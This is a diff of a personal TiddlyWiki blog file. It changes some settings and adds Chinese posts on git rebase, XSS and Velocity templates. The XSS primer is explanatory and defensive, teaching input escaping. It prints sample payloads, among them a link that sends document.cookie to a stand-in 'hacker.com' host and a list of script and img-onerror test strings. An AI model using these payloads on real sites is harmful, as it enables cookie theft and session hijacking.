@@ -172,6 +172,8 @@ Error message and password prompt
 
 <li>$:/config/RelinkOnRename</li>
 
+<li>$:/config/WikiParserRules/Inline/wikilink</li>
+
 <li>$:/core</li>
 
 <li>$:/DefaultTiddlers</li>
@@ -181,6 +183,8 @@ Error message and password prompt
 <li>$:/language</li>
 
 <li>$:/language/DefaultNewTiddlerTitle</li>
+
+<li>$:/palette</li>
 
 <li>$:/plugins/tiddlywiki/highlight</li>
 
@@ -200,9 +204,15 @@ Error message and password prompt
 
 <li>$:/themes/tiddlywiki/vanilla/options/sidebarlayout</li>
 
-<li>Customize Styling</li>
+<li>$:/themes/tiddlywiki/vanilla/settings/fontfamily</li>
 
-<li>Preview typography</li>
+<li>2017-06-23 分享几个 git 的使用场景</li>
+
+<li>2017-06-30 简单总结一下 XSS</li>
+
+<li>2017-07-06 掌握20% 常用的 Velocity</li>
+
+<li>Posts</li>
 
 <li>readable in 100+ years time</li>
 
@@ -231,8 +241,8 @@ Error message and password prompt
 <div created="20201211153121598" modified="20201211153121598" modifier="TJ" title="$:/config/NewJournal/Tags" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre></pre>
 </div>
-<div created="20201211153057908" creator="TJ" modified="20201211153110142" modifier="TJ" title="$:/config/NewJournal/Title" type="text/vnd.tiddlywiki" revision="0" bag="default">
-<pre>YYYY-MMM-DDth</pre>
+<div created="20201211153057908" creator="TJ" modified="20201220084018137" modifier="TJ" title="$:/config/NewJournal/Title" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>YYYY-MMM-DD</pre>
 </div>
 <div created="20200421053600519" modified="20200421054749258" title="$:/config/PageControlButtons/Visibility/$:/core/ui/Buttons/import" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre>show</pre>
@@ -245,6 +255,9 @@ Error message and password prompt
 </div>
 <div created="20200422091522545" modified="20200422091522555" title="$:/config/RelinkOnRename" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre>yes</pre>
+</div>
+<div created="20201220085435163" creator="TJ" modified="20201220085435173" modifier="TJ" title="$:/config/WikiParserRules/Inline/wikilink" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>disable</pre>
 </div>
 <div author="JeremyRuston" core-version="&gt;=5.0.0" dependents="" description="TiddlyWiki5 core" list="readme" name="Core" plugin-priority="0" plugin-type="plugin" title="$:/core" type="application/json" version="5.1.22" revision="0" bag="default">
 <pre>{
@@ -9619,8 +9632,9 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20200418125427020" modified="20201211153226980" title="$:/DefaultTiddlers" type="text/vnd.tiddlywiki" revision="0" bag="default">
-<pre>Welcome</pre>
+<div created="20200418125427020" modified="20201220084023471" title="$:/DefaultTiddlers" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>Welcome
+Posts</pre>
 </div>
 <div title="$:/isEncrypted" revision="0" bag="default">
 <pre>no</pre>
@@ -9630,6 +9644,9 @@ Error message and password prompt
 </div>
 <div created="20201211153115375" creator="TJ" modified="20201211153115390" modifier="TJ" title="$:/language/DefaultNewTiddlerTitle" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre></pre>
+</div>
+<div created="20201220085159410" creator="TJ" modified="20201220085159422" modifier="TJ" title="$:/palette" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>$:/palettes/Twilight</pre>
 </div>
 <div author="Joao Bolila" dependents="" description="Highlight.js syntax highlighting" list="readme usage howto license" name="Highlight" plugin-type="plugin" title="$:/plugins/tiddlywiki/highlight" type="application/json" version="5.1.22" revision="0" bag="default">
 <pre>{
@@ -9806,7 +9823,7 @@ Error message and password prompt
 <div title="$:/status/RequireReloadDueToPluginChange" revision="0" bag="default">
 <pre>no</pre>
 </div>
-<div list="Welcome" title="$:/StoryList" revision="1" bag="default">
+<div list="Welcome Posts" title="$:/StoryList" revision="1" bag="default">
 <pre></pre>
 </div>
 <div author="JeremyRuston" core-version="&gt;=5.0.0" dependents="$:/themes/tiddlywiki/vanilla" description="Emphasises individual tiddlers" name="Snow White" plugin-priority="0" plugin-type="theme" title="$:/themes/tiddlywiki/snowwhite" type="application/json" version="5.1.22" revision="0" bag="default">
@@ -9921,116 +9938,576 @@ Error message and password prompt
 <div created="20200511061828199" modified="20200511061828212" title="$:/themes/tiddlywiki/vanilla/options/sidebarlayout" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre>fluid-fixed</pre>
 </div>
-<div created="20200619171329893" modified="20200619181155048" tags="$:/tags/Stylesheet" title="Customize Styling" type="text/css" revision="0" bag="default">
-<pre>ul, ol {
-  padding-left: 2em;
-}
-
-:root {
-  --background-body: #fff;
-  --background: #efefef;
-  --background-alt: #f7f7f7;
-  --selection: #9e9e9e;
-  --text-main: #363636;
-  --text-bright: #000;
-  --text-muted: #999;
-  --links: #0076d1;
-  --focus: #0096bfab;
-  --border: #dbdbdb;
-  --code: #000;
-  --animation-duration: 0.1s;
-  --button-hover: #ddd;
-  --scrollbar-thumb: color-mod(var(--button-hover) lightness(-3%));
-  --scrollbar-thumb-hover: color-mod(var(--button-hover) lightness(-10%));
-  --form-placeholder: #949494;
-  --form-text: #000;
-  --variable: #39a33c;
-  --highlight: #ff0;
-  --select-arrow: svg-load('./assets/select-arrow.svg', fill: #161f27);
-}
-
-h1,
-h2,
-h3,
-h4,
-h5,
-h6,
-strong {
-  margin-top: 0;
-  margin-bottom: 12px;
-  color: var(--text-bright);
-  font-weight: 600;
-}
-
-.tc-tiddler-body &gt; h1::before {
-  content: '# ';
-  font-size: 0.85em;
-  margin-left: -0.87em;
-  color: var(--focus);
-}
-
-.tc-tiddler-body &gt; h2::before {
-  content: '## ';
-  font-size: 0.85em;
-  margin-left: -1.55em;;
-  color: var(--focus);
-}
-
-.tc-tiddler-body &gt; h3::before {
-  content: '### ';
-  font-size: 0.85em;
-  margin-left: -2.2em;
-  color: var(--focus);
-}
-
-q::before {
-   content: none;
-}
-
-q::after {
-   content: none;
-}
-
-blockquote, q {
-  border-left: 4px solid var(--focus);
-  margin: 1.5em 0em;
-  font-style: italic;
-}
-
-blockquote &gt; footer {
-  font-style: normal;
-  border: 0;
-}
-
-blockquote cite {
-  font-style: normal;
-}
-
-address {
-  font-style: normal;
-}
-
-mark {
-  background-color: var(--highlight);
-  border-radius: 2px;
-  padding: 0px 2px 0px 2px;
-  color: #000000;
-}</pre>
+<div created="20201220085555836" creator="TJ" modified="20201220090929957" modifier="TJ" title="$:/themes/tiddlywiki/vanilla/settings/fontfamily" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>Georgia, Merriweather, serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;</pre>
 </div>
-<div created="20200619172954029" modified="20200619173123377" tags="" title="Preview typography" type="text/vnd.tiddlywiki" revision="0" bag="default">
-<pre>! h1 
+<div created="20170623082426711" creator="TJ" modified="20201220092238061" modifier="TJ" tags="Git Post" title="2017-06-23 分享几个 git 的使用场景" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>你真的会使用 git 吗？你能回答下面几个问题吗？ 有三个 commit（顺序：CommitA、CommitB、CommitC），它们相互独立，没有依赖。
 
-!! h2
+# 在不修改 B、C 的前提下，修改 A，怎么操作？
+# 合并 A、B、C 为一个 commit，怎么操作？
+# 调整 A、B、C 的顺序编程 C、B、A，怎么操作？
 
-!!! h3
+作为一个开发，日常工作中不可避免的要使用 git。 当然了，如果你技术无敌、独立承担一个项目、没人干预或者影响你的工作，那么你可能不需要下面这些总结。哈哈哈...
 
-!!!! h4
+由于 xxx 原因，我认为应该给项目组的其他人讲讲 git。 因为语言障碍和技术熟练度的障碍，为了让同事们更好地理解并且愿意使用 git 。我不得不一个场景一个方法地讲解，所以有了下面总结。
 
-!!!!! h5
+&gt;    这难道不是一种成长吗？
 
-!!!!! h6</pre>
+!! 场景 1
+
+J 写了一个功能，分成 3 次 commit（顺序：CommitA、CommitB、CommitC）。完成功能之后，他找了 B 先生进行 Code Review，B 先生觉得 CommitB 和 CommitC 没有问题，CommitA 需要进行简单修改。 那么如何在不改变 CommitB 和 CommitC 的前提下，修改 CommitA 呢？
+方法：
+
+使用 git rebase -i，操作如下
+
+1.    rebase CommitA、CommitB、CommitC 三个 commit
+
+```
+$ git rebase -i &lt;parent commit of A&gt;
+```
+
+2.    edit CommitA，将 Commit A 前面 pick 修改为edit
+
+```
+edit d3d4537 CommitA
+pick 498bf7a CommitB
+pick 1d84bb8 CommitC
+```
+
+这时 HEAD 停留在 CommitA，可以对 CommitA 进行修改，然后使用下面命令覆盖 CommitA
+
+```
+$ git add &lt;修改文件&gt;
+$ git commit -amend
+```
+
+3.    让 git 完成后续 rebase 操作
+
+```
+$ git rebase -continue
+```
+
+
+!! 场景 2
+
+J 修改了 CommitA 后，项目 leader 希望一个功能尽可能使用一个 commit 提交。 那么如何合并 CommitA、CommitB、CommitC 为一个 commit 呢？
+
+!!! 方法：
+
+同样使用 git rebase -i，操作如下
+
+1.    rebase CommitA、CommitB、CommitC 三个 commit
+
+```
+$ git rebase -i &lt;parent commit of A&gt;
+```
+
+2.    合并 Commits (1)CommitB 和 CommitC 前面 pick 修改为squash，然后:wq保存退出。
+
+```
+pick fa42d43 CommitA
+squash 86a09b9 CommitB
+squash 360d9a3 CommitC
+```
+
+3.    让 git 完成后续 rebase 操作
+
+```
+$ git rebase -continue
+```
+
+!! 场景 3
+
+J 合并 CommitA、CommitB、CommitC 后，新产生的 CommitA+需要将代码更新到 master 上。但是，同一项目组的 T 已经提交了 CommitD。 本来 J 只需要 merge 自己的 CommitA+到 master 就可以了，但是 J 下一个任务依赖于 T 提交的 CommitD。 J 希望一次性更新master和自己的 branch（branch_J_dev），一石二鸟。 那么如何在 merge 自己的 CommitA+到 master 的同时将 CommitD 也 merge 到自己的 branch（branch_J_dev）中呢？
+
+!!! 方法：
+
+又是使用 git rebase，操作如下
+
+1.     rebase 自己的branch_J_dev 到 master
+
+```
+$ git checkout branch_J_dev
+$ git rebase --onto master &lt;CommitA+&gt;
+```
+
+2.    master 合并 branch_J_dev 的提交
+
+```
+$ git checkout master
+$ git merge branch_J_dev
+```
+
+git checkout master 和 git merge branch_J_dev 非常重要，网络上大部分教程都没有最后一步。 而且好多人都把命令写成了 `git rebase --ontomaster &lt;commit id&gt;`，看来全是抄袭同一个人的，也是醉了。哈哈哈哈... 我也是因为被坑了，所以才查了一下一下资料，发现竟然还需要一步。
+
+
+!! 场景 4（需求基本和场景 3 一致）
+
+如何 J 本次希望提交的代码有 CommitA+、CommitB+、CommitC+三次 commit（顺序：CommitA+、CommitB+、CommitC+）。 那么如何在 merge 自己的 CommitA+、CommitB+、CommitC+到 master 的同时将 CommitD 也 merge 到自己的 branch（branch_J_dev）中呢？
+
+!!! 方法：
+
+基本和场景 3 一致，操作如下
+
+1.    rebase 自己的branch_J_dev 到 master
+
+```
+$ git checkout branch_J_dev
+$ git rebase --onto master &lt;CommitA+&gt;^
+//  ^代表，起点。&lt;CommitA+&gt;^表示 CommitA 为起点后面所有的 Commit。
+```
+
+2.    CommitA 合并进master
+
+```
+$ git checkout master
+$ git merge branch_J_dev
+```
+
+!! 场景 5
+
+如何修改 commit 记录（调整顺序+修改 message）？ 其实这种操作没什么意义，但是对于对 commit log 有强迫症的人，或许有想修改 commit 记录的冲动。 哈哈哈哈...
+
+!!! 方法：
+
+还是使用 git rebase。惊喜不惊喜？意外不意外？操作如下
+
+1.    rebase CommitD 和 CommitA+
+
+```
+$ git rebase -i &lt;parent commit of D&gt;
+```
+
+2.    调整 commit 顺序，就是将 CommitD 和 CommitA+ 顺序进行调整。
+3.    修改 message ，将 pick 修改为reword。
+4.    让 git 完成后续 rebase 操作
+
+```
+$ git rebase --continue
+```
+
+!!（最后）小提示
+
+1.    如果想中途取消 rebase 操作，后悔药 👇
+
+```
+$ git rebase --abort
+```
+
+2.    git rebase 一旦结束，将丢失原本 branch 信息，非常危险。 我在做分享时，git rebase --onto就出现了失误并且没能找回原来 branch 信息，场面十分尴尬。 所以建议还是用 merge 吧，安全一点。
+
+```
+$ git checkout master
+$ git pull
+$ git merge branch_J_dev
+```
+
+希望这篇文章对你有帮助。
+</pre>
 </div>
-<div created="20200503023204668" modified="20200619171159097" title="readable in 100+ years time" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<div created="20201220092626235" creator="TJ" modified="20201220093147414" modifier="TJ" tags="XSS Post" title="2017-06-30 简单总结一下 XSS" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>
+你听说过 XSS 吗？
+
+XSS（Cross-site scripting, 跨站脚本）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。
+研究表明，最近几年 XSS 已经超过 “缓冲区溢出” 成为最流行的攻击方式，有 68%的网站可能遭受此类攻击。
+
+那么检测一下你是否充分了解 XSS 吧
+
+#XSS 为什么会发生？
+# XSS 有几种类型？
+# XSS 如何预防和修复？
+
+如果可以回答 👆3 个问题，这篇文章对你提升是微乎其微的。
+如果不可以，你可以花十分钟左右阅读一下。
+
+我目前的客户是一家银行，因为企业特性和业务需求，对系统安全高度重视。
+
+因此，我不得不分析了整个系统，从中找出未对应 XSS 的 Code 。说实话，虽然是企业内部系统，但是代码也不少，看代码看的我都快吐了。
+
+&gt; 得益于此，让我对`XSS`的理解更加深了一层。
+
+!! 1. XSS 为什么会发生？
+
+因为用户输入的数据被当成代码执行了。
+
+那么，为什么用户输入的数据会被当成代码并且被执行呢？
+因为当用户输入尖括号`&lt; &gt;`，引号`'` `&quot;`，斜杠`/`之类的特殊字符时，可能**破坏原始的代码结构**，导致输入的部分内容被当成代码，并且被执行。
+
+[小例子]
+假如有下面一个 textbox
+
+```html
+&lt;input type=&quot;text&quot; name=&quot;message&quot; value=&quot;hello tj&quot;&gt;
+```
+
+`hello tj`是来自用户的输入，如果用户不是输入`hello tj`,而是输入`&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name=&quot;` 那么就会变成 👇 的样子。
+
+```html
+&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;&quot; /&gt;&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+&lt;p name=&quot;&quot;&gt;&lt;/p&gt;
+```
+
+可不可怕？
+
+!! 2. XSS 有几种类型？
+
+XSS 有两种类型，`反射型XSS`和`持久型XSS`。
+
+!!! 反射型 XSS
+
+也就是非持久型 XSS，常见诱骗用户点击带有攻击代码的 URL 链接，链接被浏览器执行，从而攻击用户。
+只有当前用户被影响，影响范围：小。
+
+[小例子]
+
+```html
+&lt;a
+  href=&quot;http://xxx91.com/index?term=&lt;script&gt;window.open('http://hacker.com?yourcookie='+document.cookie)&lt;/script&gt;&quot;
+  &gt;小姐姐&lt;/a
+&gt;
+```
+
+如果你点击了 👆 链接，你 cookie 信息就有可能被发送到黑客的服务器`http://hacker.com`。
+
+虽然链接可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏攻击代码。
+
+!!! 持久型 XSS
+
+也叫存储型 XSS，提交包含攻击代码的数据到服务器。
+所有浏览这部分数据的用户都将被攻击代码影响，影响范围：大
+
+[小例子]
+
+html 模版如下：
+
+```html
+&lt;input type=&quot;text&quot; name=&quot;message&quot; value=&quot;${message}&quot; /&gt;
+```
+
+当从数据库查询的 message 如下：
+`&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name=&quot;`
+生成的 html 将变成 👇：
+
+```html
+&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;&quot; /&gt;&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+&lt;p name=&quot;&quot;&gt;&lt;/p&gt;
+```
+
+此时，html 可能已经不受我们控制了。
+
+!! 3. XSS 如何预防和修复？
+
+&gt; 原则：所有用户输入都是不可信的。（注意：攻击代码不一定仅在`&lt;script&gt;&lt;/script&gt;`中。）
+
+* 预防 反射型 XSS
+  将重要的 cookie 标记为`http only`，这样的话 Javascript 中的 document.cookie 语句就不能获取到 cookie 了。
+
+* 预防 持久型 XSS
+  处理掉可能破坏原始代码结构的特殊字符。将特殊字符编码成转义字符，使其成为数据的一部分而不是代码。
+
+[需要编码的 7 个字符]
+
+```
+&amp;     –&gt;     &amp;amp;
+&lt;     –&gt;     &amp;lt;
+&gt;     –&gt;     &amp;gt;
+&quot;     –&gt;     &amp;quot;
+`     -&gt;     &amp;#x60;
+'     –&gt;     &amp;#x27;
+/     –&gt;     &amp;#x2f;
+```
+
+有两点需要特别说明的是:
+
+# 不推荐将单引号`'`编码为 `&amp;apos`; ，因为它并不是标准的 HTML 标签
+# 需要对斜杠号`/`编码，因为在进行 XSS 攻击时，斜杠号对于关闭当前 HTML 标签非常有用
+
+!!（最后）
+
+# 分享一段简单的代码
+
+```js
+function escapeHtml(value) {
+  if (typeof value !== &quot;string&quot;) {
+    return value
+  }
+  return value.replace(/[&amp;&lt;&gt;`&quot;'\/]/g, function(result) {
+    return {
+      &quot;&amp;&quot;: &quot;&amp;amp;&quot;,
+      &quot;&lt;&quot;: &quot;&amp;lt;&quot;,
+      &quot;&gt;&quot;: &quot;&amp;gt;&quot;,
+      &quot;`&quot;: &quot;&amp;#x60;&quot;,
+      '&quot;': &quot;&amp;quot;&quot;,
+      &quot;'&quot;: &quot;&amp;#x27;&quot;,
+      &quot;/&quot;: &quot;&amp;#x2f;&quot;,
+    }[result]
+  })
+}
+```
+
+# 分享一些用于检测 XSS 的测试用例
+
+```html
+&gt;&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+='&gt;&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+&quot;&gt;&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+&lt;script&gt;
+  alert(document.cookie)
+&lt;/script&gt;
+&lt;script&gt;
+  alert(vulnerable)
+&lt;/script&gt;
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&lt;script&gt;
+  alert(&quot;XSS&quot;)
+&lt;/script&gt;
+&lt;img src=&quot;javascript:alert('XSS')&quot; /&gt;
+&lt;img src=&quot;http://xxx.com/yyy.png&quot; onerror=&quot;alert('XSS')&quot; /&gt;
+```
+
+希望这篇文章对你有帮助。
+</pre>
+</div>
+<div created="20201220093253134" creator="TJ" modified="20201220093948489" modifier="TJ" tags="Post Velocity" title="2017-07-06 掌握20% 常用的 Velocity" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>工作以后，我越来越能体会到 80/20 法则的强大。
+
+这是一个不可否认的事实，常用 20% 的技术可以解决工作中 80% 的场景。
+所以我希望能介绍给你 Velocity 技术 20%，帮助你胜任 80% 的工作。
+
+废话少说，进入正题。
+
+!! 概要
+
+# Velocity 是什么？
+# Velocity 能做什么？
+# Velocity 示例
+
+!! 1. Velocity 是什么？
+
+Velocity 是一个基于 Java 的模版引擎，它提供模版语言用于引用 Java 代码定义的对象。
+
+!! 2. Velocity 能做什么？
+
+# Velocity 能创建 HTML 页面，并预留占位符。（最基本用途）
+# Velocity 能基于模板生成 Java，SQL 源代码。（没见过）
+# 自动生成电子邮件。（没见过）
+# 读取 XML，并转换成需要的文档格式，通常是 HTML。（没见过）
+
+!! 3. Velocity 示例
+
+!!! Velocity 注解
+
+* 单行 `##`
+* 多行 `#* *#`
+* 代码块注释(信息) `##* *#`
+
+!!! Velocity 变量
+
+定义：
+
+```java
+#set( $foo = &quot;Velocity&quot; )
+```
+
+使用：
+
+```java
+$foo
+${foo}
+```
+
+!!! Velocity 集合
+
+```java
+#set( $greatlakes = [&quot;Superior&quot;,&quot;Michigan&quot;,&quot;Huron&quot;,&quot;Erie&quot;,&quot;Ontario&quot;] )
+```
+
+!!! Velocity 条件判断
+
+```java
+#if( $foo &lt; 10 )
+    &lt;strong&gt;Go North&lt;/strong&gt;
+#elseif( $foo == 10 )
+    &lt;strong&gt;Go East&lt;/strong&gt;
+#else
+    &lt;strong&gt;Go West&lt;/strong&gt;
+#end
+```
+
+!!! Velocity 循环
+
+```
+#foreach( $customer in $customerList )
+    #if( $foreach.count &gt; 5 )
+        #break
+    #end
+    $customer.Name
+#end
+```
+
+!!! Velocity 引用文件
+
+```java
+#include( &quot;one.vm&quot; ) one.vm 不解析。
+#parse( &quot;me.vm&quot; ) me.vm 解析。
+```
+
+!! Velocity 定义代码块
+
+```java
+#define( $block )
+Hello $who
+#end
+
+#set( $who = 'World!' )
+$block
+```
+
+!! Velocity 宏调用
+
+* 无参
+
+```java
+#macro( d )
+&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
+#end
+
+#d()
+```
+
+* 单参
+
+```java
+#macro( d )
+&lt;tr&gt;&lt;td&gt;$!bodyContent&lt;/td&gt;&lt;/tr&gt;
+#end
+
+#@d()Hello#end
+```
+
+* 任意参数
+
+```java
+## 定义
+#macro( tablerows $color $somelist )
+#foreach( $something in $somelist )
+    &lt;tr&gt;&lt;td bgcolor=$color&gt;$something&lt;/td&gt;&lt;/tr&gt;
+#end
+#end
+```
+
+```java
+## 调用
+#set( $greatlakes = [&quot;Superior&quot;,&quot;Michigan&quot;,&quot;Huron&quot;,&quot;Erie&quot;,&quot;Ontario&quot;] )
+#set( $color = &quot;blue&quot; )
+&lt;table&gt;
+    #tablerows( $color $greatlakes )
+&lt;/table&gt;
+```
+
+
+
+```html
+&lt;!- 输出 --&gt;
+&lt;table&gt;
+  &lt;tr&gt;
+    &lt;td bgcolor=&quot;blue&quot;&gt;Superior&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td bgcolor=&quot;blue&quot;&gt;Michigan&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td bgcolor=&quot;blue&quot;&gt;Huron&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td bgcolor=&quot;blue&quot;&gt;Erie&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td bgcolor=&quot;blue&quot;&gt;Ontario&lt;/td&gt;
+  &lt;/tr&gt;
+&lt;/table&gt;
+```
+
+! Velocity 填坑
+
+1. 各种写法
+
+```java
+$foo
+## is the same as
+${foo}
+
+$foo.getBar()
+## is the same as
+$foo.Bar
+
+$data.setUser(&quot;jon&quot;)
+## is the same as
+#set( $data.User = &quot;jon&quot; )
+
+$data.getRequest().getServerName()
+## is the same as
+$data.Request.ServerName
+## is the same as
+${data.Request.ServerName}
+```
+
+2. Velocity 变量未定义
+
+使用 `$!`，例
+
+```java
+$!foo
+```
+
+当 foo 未定义，输出空白字符串。
+
+3. Velocity 调用顺序
+Velocity 中`$customer.address`，调用顺序：
+
+```java
+getaddress()
+getAddress()
+get(&quot;address&quot;)
+isAddress()
+```
+
+4. `#if (\$foo)`
+
+两种情况都返回 true：
+
+# $foo是一个 boolean 类型，且为 true。
+# $foo 不是 0，也不是 null。
+
+5. `#if ($foo == $bar)`
+
+因为 Velocity 变量最终都作为字符串输出，所以 Velocity 会自动调用 .toString() 将变量转换成字符串。
+所以，$foo 和 $bar 都当成字符串进行比较。即使 Java 代码中类型不同，也有可能返回 true。
+
+!! Velocity 严格模式
+
+Velocity 1.6 引入**严格引用模式**，通过设置 Velocity 配置属性“runtime.references.strict”为 true 激活。
+当遇到没有定义或者存在歧义的情况 Velocity 将抛出异常。
+
+希望这篇文章对你有帮助。
+</pre>
+</div>
+<div created="20201220083108305" creator="TJ" modified="20201220085108743" modifier="TJ" tags="" title="Posts" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<pre>&lt;&lt;list-links filter:&quot;[tag[Post]]&quot;&gt;&gt;</pre>
+</div>
+<div created="20200503023204668" creator="TJ" modified="20201220085533526" modifier="TJ" title="readable in 100+ years time" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre>! 如何才能让 website 在100年后仍然可读？
 
 # 零依赖
@@ -10051,7 +10528,7 @@ mark {
 
 </pre>
 </div>
-<div created="20200418124902034" creator="TJ" modified="20201215025906886" modifier="TJ" title="Welcome" type="text/vnd.tiddlywiki" revision="0" bag="default">
+<div created="20200418124902034" creator="TJ" modified="20201220084419206" modifier="TJ" title="Welcome" type="text/vnd.tiddlywiki" revision="0" bag="default">
 <pre>嗨，欢迎来到我的 Blog。
 
 本页面使用 TiddlyWiki 构建。
@@ -10064,7 +10541,8 @@ mark {
 
 我从我的精神导师那里学习到这个技术。 [[https://joearms.github.io/#2018-12-26 Fun with the TiddlyWiki|https://joearms.github.io/#2018-12-26 Fun with the TiddlyWiki]]
 
-如果你也想尝试一下，看这里 [[TiddlyWiki|https://tiddlywiki.com/]]</pre>
+如果你也想尝试一下，看这里 [[TiddlyWiki|https://tiddlywiki.com/]]
+</pre>
 </div>
 
 
